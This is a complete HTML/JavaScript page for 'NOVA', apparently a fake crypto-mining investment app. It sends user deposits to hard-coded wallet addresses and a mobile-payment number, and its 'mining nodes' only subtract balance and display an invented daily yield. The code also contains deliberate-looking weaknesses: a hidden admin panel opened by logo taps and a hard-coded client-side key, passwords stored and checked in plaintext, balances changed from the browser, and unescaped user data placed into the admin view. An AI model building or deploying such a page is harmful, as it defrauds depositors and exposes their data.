<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA | Enterprise Mining Solutions</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;600;900&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #D4AF37; --bg: #050505; }
        body { background: var(--bg); color: white; font-family: 'Outfit', sans-serif; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
        .glass { background: rgba(255,255,255,0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.05); border-radius: 24px; }
        .btn-prime { background: linear-gradient(135deg, #D4AF37 0%, #FBE795 100%); color: black; font-weight: 900; border-radius: 16px; transition: 0.3s; text-transform: uppercase; font-size: 10px; letter-spacing: 1px; }
        .btn-prime:active { transform: scale(0.95); }
        .nova-input { background: #0c0c0c; border: 1px solid #1a1a1a; width: 100%; padding: 16px; border-radius: 15px; color: white; font-size: 13px; outline: none; margin-bottom: 12px; }
        .screen { display: none; padding-bottom: 110px; animation: slideUp 0.4s ease-out; }
        .active-screen { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(5,5,5,0.95); border-top: 1px solid #111; display: flex; justify-content: space-around; padding: 18px; z-index: 1000; }
        .nav-item { color: #444; transition: 0.3s; font-size: 10px; font-weight: 900; display: flex; flex-direction: column; align-items: center; gap: 4px; }
        .nav-item.active { color: var(--gold); }
        .modal { display: none; position: fixed; inset: 0; background: #000; z-index: 2000; padding: 25px; overflow-y: auto; }
    </style>
</head>
<body>

    <div id="auth-screen" class="min-h-screen flex flex-col p-10 justify-center active-screen">
        <h1 onclick="handleTaps()" class="text-5xl font-black mb-2 italic">NOVA<span class="text-[#D4AF37]">.</span></h1>
        <p class="text-[9px] text-gray-600 font-black tracking-[6px] uppercase mb-12">Institutional Mining Node</p>
        <div class="space-y-3">
            <input type="text" id="u-email" placeholder="Terminal ID" class="nova-input">
            <input type="password" id="u-pass" placeholder="Passkey" class="nova-input">
            <input type="text" id="adm-key" placeholder="System Root Key" class="hidden nova-input border-[#D4AF37]">
            <button onclick="auth()" class="w-full btn-prime py-5">Access System</button>
            <p onclick="toggleM()" id="m-text" class="text-center text-[10px] mt-8 text-gray-500 font-black uppercase tracking-widest cursor-pointer">Register New ID</p>
        </div>
    </div>

    <div id="app" class="hidden">
        <header class="p-6 flex justify-between items-center sticky top-0 bg-black/80 backdrop-blur-md z-50">
            <div class="flex items-center gap-3">
                <div class="w-8 h-8 glass flex items-center justify-center text-[#D4AF37] font-black border-[#D4AF37]/30 text-xs">N</div>
                <p id="user-display" class="text-[10px] font-black uppercase text-gray-400"></p>
            </div>
            <i onclick="location.reload()" class="fa-solid fa-power-off text-gray-700"></i>
        </header>

        <div id="dash-screen" class="screen active-screen px-6">
            <div class="glass p-8 mb-6 border-b-2 border-[#D4AF37]/40 text-center">
                <p class="text-[9px] text-gray-500 font-black uppercase mb-3 tracking-widest">Total Asset Value</p>
                <h1 id="main-bal" class="text-5xl font-black tracking-tighter">$0.00</h1>
                <p id="v-daily" class="text-[10px] font-black text-green-500 mt-4 uppercase">Yield: +$0.00 Daily</p>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="openModal('dep-modal')" class="glass p-5 flex flex-col items-center gap-2"><i class="fa-solid fa-plus text-[#D4AF37]"></i><span class="text-[9px] font-black">DEPOSIT</span></button>
                <button onclick="openModal('wd-modal')" class="glass p-5 flex flex-col items-center gap-2"><i class="fa-solid fa-minus text-red-500"></i><span class="text-[9px] font-black">WITHDRAW</span></button>
            </div>

            <div class="glass p-6 mb-6">
                <p class="text-[9px] font-black text-gray-500 mb-3 uppercase">Promo Redemption</p>
                <div class="flex gap-2">
                    <input type="text" id="promo-inp" placeholder="CODE" class="nova-input mb-0 flex-1 py-3 text-xs uppercase">
                    <button onclick="applyPromo()" class="btn-prime px-6 text-[9px]">Apply</button>
                </div>
            </div>

            <div class="glass p-6 mb-6">
                <p class="text-[9px] font-black text-gray-500 mb-2 uppercase">Your Referral ID</p>
                <div class="flex justify-between items-center bg-black/40 p-4 rounded-xl border border-white/5">
                    <span id="ref-id" class="text-xs font-bold text-[#D4AF37]">NOVA-4821</span>
                    <i class="fa-solid fa-copy text-gray-600" onclick="alert('Copied!')"></i>
                </div>
            </div>
        </div>

        <div id="hist-screen" class="screen px-6">
            <h2 class="text-2xl font-black mb-6 uppercase tracking-tighter">Transaction <span class="text-[#D4AF37]">Logs</span></h2>
            <div id="hist-container" class="space-y-4"></div>
        </div>

        <div id="mine-screen" class="screen px-6">
            <h2 class="text-2xl font-black mb-6 uppercase tracking-tighter">Hardware <span class="text-[#D4AF37]">Farm</span></h2>
            <div id="nodes-container" class="space-y-5"></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('dash-screen')" class="nav-item active" id="nav-dash"><i class="fa-solid fa-house-chimney text-lg"></i><span>HOME</span></div>
            <div onclick="nav('mine-screen')" class="nav-item" id="nav-mine"><i class="fa-solid fa-microchip text-lg"></i><span>MINING</span></div>
            <div onclick="nav('hist-screen')" class="nav-item" id="nav-hist"><i class="fa-solid fa-receipt text-lg"></i><span>HISTORY</span></div>
        </nav>
    </div>

    <div id="dep-modal" class="modal">
        <div onclick="closeModal('dep-modal')" class="mb-8 text-gray-500 text-[10px] font-black uppercase">Cancel</div>
        <h2 class="text-3xl font-black mb-8 italic">DEPOSIT FUNDS</h2>
        <select id="dep-method" class="nova-input" onchange="updateAddr()">
            <option value="Binance">Binance (USDT-TRC20)</option>
            <option value="Trust">Trust Wallet (BEP20)</option>
            <option value="Jazz">JazzCash/EasyPaisa</option>
        </select>
        <div class="glass p-5 mb-6 text-center"><p id="dep-addr" class="text-[10px] font-mono text-gray-400">0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37</p></div>
        <input type="number" id="dep-amt" placeholder="Amount ($)" class="nova-input">
        <input type="text" id="dep-tid" placeholder="Transaction TID" class="nova-input">
        <p class="text-[9px] text-gray-600 uppercase font-black mb-2">Upload Screenshot</p>
        <input type="file" id="dep-proof" accept="image/*" class="text-xs text-gray-500 mb-8">
        <button onclick="requestFin('Deposit')" class="w-full btn-prime py-5">Submit Request</button>
    </div>

    <div id="wd-modal" class="modal">
        <div onclick="closeModal('wd-modal')" class="mb-8 text-gray-500 text-[10px] font-black uppercase">Cancel</div>
        <h2 class="text-3xl font-black mb-8 text-red-500 italic">WITHDRAW ASSETS</h2>
        <input type="number" id="wd-amt" placeholder="Amount ($)" class="nova-input">
        <input type="text" id="wd-acc" placeholder="Account Number / Wallet" class="nova-input">
        <button onclick="requestFin('Withdrawal')" class="w-full bg-white text-black font-black py-5 rounded-2xl uppercase text-[10px]">Verify & Extract</button>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-black z-[9999] p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-8 border-b border-white/5 pb-4">
            <h2 class="text-[#D4AF37] font-black uppercase text-sm">System Root</h2>
            <button onclick="location.reload()" class="text-red-500 font-black text-xs">LOGOUT</button>
        </div>
        <div id="adm-list" class="space-y-4"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig); const db = getFirestore(app);
        let activeUser = null; let isLogin = true;

        const addrs = { "Binance": "0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37", "Trust": "0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2", "Jazz": "0300-1234567" };
        window.updateAddr = () => { document.getElementById('dep-addr').innerText = addrs[document.getElementById('dep-method').value]; };

        window.auth = async () => {
            const id = document.getElementById('u-email').value.toLowerCase().trim();
            const pw = document.getElementById('u-pass').value;
            const ak = document.getElementById('adm-key').value;
            if(ak === "nov786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); return; }
            if(!id || !pw) return alert("Fill data");
            const uRef = doc(db, "users", id); const s = await getDoc(uRef);
            if(!isLogin) {
                if(s.exists()) return alert("ID Taken");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0, ref: "NOVA-" + Math.floor(1000+Math.random()*9000) });
                start(id);
            } else if(s.exists() && s.data().password === pw) {
                start(id);
            } else alert("Invalid Login");
        };

        function start(id) {
            activeUser = id; document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('app').classList.remove('hidden');
            onSnapshot(doc(db, "users", id), d => {
                const data = d.data();
                document.getElementById('main-bal').innerText = "$" + (data.balance || 0).toFixed(2);
                document.getElementById('v-daily').innerText = "Yield: +$" + (data.daily || 0).toFixed(2) + " Daily";
                document.getElementById('ref-id').innerText = data.ref;
                document.getElementById('user-display').innerText = id;
            });
            loadHistory(); renderNodes();
        }

        window.requestFin = async (type) => {
            const uRef = doc(db, "users", activeUser); const s = await getDoc(uRef);
            let payload = { user: activeUser, type, status: 'Pending', time: Date.now() };
            if(type === 'Deposit') {
                payload.amount = parseFloat(document.getElementById('dep-amt').value);
                payload.tid = document.getElementById('dep-tid').value;
                const file = document.getElementById('dep-proof').files[0];
                if(file) {
                    const r = new FileReader(); r.onloadend = async () => { payload.proof = r.result; await addDoc(collection(db, "logs"), payload); alert("Sent!"); closeModal('dep-modal'); }; r.readAsDataURL(file);
                } else { await addDoc(collection(db, "logs"), payload); alert("Sent!"); closeModal('dep-modal'); }
            } else {
                payload.amount = parseFloat(document.getElementById('wd-amt').value);
                payload.acc = document.getElementById('wd-acc').value;
                if(s.data().balance < payload.amount) return alert("Low Balance");
                await updateDoc(uRef, { balance: s.data().balance - payload.amount });
                await addDoc(collection(db, "logs"), payload); alert("Wait for Approval"); closeModal('wd-modal');
            }
        };

        function loadHistory() {
            onSnapshot(query(collection(db, "logs"), where("user", "==", activeUser), orderBy("time", "desc")), s => {
                const h = document.getElementById('hist-container'); h.innerHTML = "";
                s.forEach(d => {
                    const r = d.data();
                    h.innerHTML += `<div class="glass p-5 flex justify-between items-center">
                        <div><p class="text-[9px] font-black uppercase text-gray-500">${r.type}</p><p class="text-sm font-bold">$${r.amount}</p></div>
                        <span class="text-[8px] font-black px-3 py-1 rounded-full ${r.status=='Pending'?'bg-yellow-500/10 text-yellow-500':'bg-green-500/10 text-green-500'}">${r.status.toUpperCase()}</span>
                    </div>`;
                });
            });
        }

        window.applyPromo = async () => {
            const code = document.getElementById('promo-inp').value.toUpperCase();
            if(code === "NOVA100") {
                const uRef = doc(db, "users", activeUser); const s = await getDoc(uRef);
                await updateDoc(uRef, { balance: s.data().balance + 100 });
                alert("Promo Applied! $100 Added.");
            } else alert("Invalid Code");
        };

        function renderNodes() {
            const container = document.getElementById('nodes-container'); container.innerHTML = "";
            for(let i=1; i<=20; i++) {
                let p = i===1?15:(i*90); let y = (p*0.06).toFixed(2);
                container.innerHTML += `<div class="glass p-6 flex justify-between items-center border-l-4 border-[#D4AF37]">
                    <div><p class="text-[8px] font-black text-gray-500 uppercase">SERVER-v.${i}</p><p class="text-lg font-black">$${p}</p></div>
                    <button onclick="buyNode(${p},${y})" class="btn-prime px-6 py-3">Lease</button>
                </div>`;
            }
        }

        window.buyNode = async (p, d) => {
            const uRef = doc(db, "users", activeUser); const s = await getDoc(uRef);
            if(s.data().balance < p) return alert("Low Liquidity");
            await updateDoc(uRef, { balance: s.data().balance - p, daily: (s.data().daily || 0) + parseFloat(d) });
            alert("Mining Initialized!");
        };

        function loadAdmin() {
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
                const al = document.getElementById('adm-list'); al.innerHTML = "";
                s.forEach(d => {
                    const r = d.data();
                    al.innerHTML += `<div class="glass p-5 border-l-4 ${r.type=='Deposit'?'border-green-500':'border-red-500'} bg-white/5">
                        <div class="flex justify-between items-center mb-3"><span class="text-[9px] font-black uppercase text-gray-500">${r.type}</span><span class="text-xl font-black">$${r.amount}</span></div>
                        <p class="text-[8px] text-gray-400 mb-4">USER: ${r.user} | TID/ACC: ${r.tid || r.acc}</p>
                        ${r.proof ? `<button onclick="window.open('${r.proof}')" class="text-blue-500 text-[9px] mb-4 block underline uppercase font-black">View Proof Image</button>` : ''}
                        <div class="flex gap-2">
                            <button onclick="approve('${d.id}','${r.user}',${r.amount},'${r.type}')" class="flex-1 bg-green-600 py-3 rounded-xl text-[9px] font-black uppercase">Approve</button>
                            <button onclick="reject('${d.id}','${r.user}',${r.amount},'${r.type}')" class="flex-1 bg-red-600 py-3 rounded-xl text-[9px] font-black uppercase">Reject</button>
                        </div>
                    </div>`;
                });
            });
        }

        window.approve = async (id, u, a, t) => { if(t === 'Deposit') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); } await updateDoc(doc(db, "logs", id), { status: 'Success' }); };
        window.reject = async (id, u, a, t) => { if(t === 'Withdrawal') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); } await updateDoc(doc(db, "logs", id), { status: 'Rejected' }); };
        window.handleTaps = () => { window.taps = (window.taps || 0) + 1; if(window.taps >= 6) document.getElementById('adm-key').classList.remove('hidden'); };
        window.toggleM = () => { isLogin = !isLogin; document.getElementById('m-text').innerText = isLogin ? "Register New ID" : "Back to Access"; };
        window.openModal = (id) => document.getElementById(id).style.display = 'block';
        window.closeModal = (id) => document.getElementById(id).style.display = 'none';
        window.nav = (id) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById('nav-' + id.split('-')[0]).classList.add('active');
        };
    </script>
</body>
</html>
